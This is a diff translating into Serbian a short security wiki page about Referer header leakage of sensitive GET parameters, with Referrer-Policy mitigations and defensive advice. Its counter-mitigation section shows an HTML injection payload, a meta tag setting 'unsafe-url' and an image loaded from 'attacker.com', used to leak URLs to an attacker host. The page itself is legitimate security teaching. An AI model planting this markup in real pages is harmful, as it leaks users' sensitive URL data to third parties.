@@ -2,16 +2,15 @@
 
 # Referrer headers and policy
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer je header koji koriste pregledači da označe koja je bila prethodna stranica koja je posetjena.
 
-## Sensitive information leaked
+## Osetljive informacije otkrivene
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+Ako se u nekom trenutku unutar web stranice bilo koja osetljiva informacija nalazi u GET parametrima, ako stranica sadrži linkove ka spoljnim izvorima ili napadač može da natera/predloži (socijalni inženjering) korisniku da poseti URL koji kontroliše napadač. To bi moglo omogućiti eksfiltraciju osetljivih informacija unutar poslednjeg GET zahteva.
 
-## Mitigation
+## Mitigacija
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+Možete naterati pregledač da prati **Referrer-policy** koja bi **izbegla** slanje osetljivih informacija drugim web aplikacijama:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-
 ## Counter-Mitigation
 
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+Možete prepisati ovo pravilo koristeći HTML meta tag (napadač treba da iskoristi i HTML injekciju):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## Odbrana
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+Nikada ne stavljajte osetljive podatke unutar GET parametara ili putanja u URL-u.
 
 {{#include ./banners/hacktricks-training.md}}
-
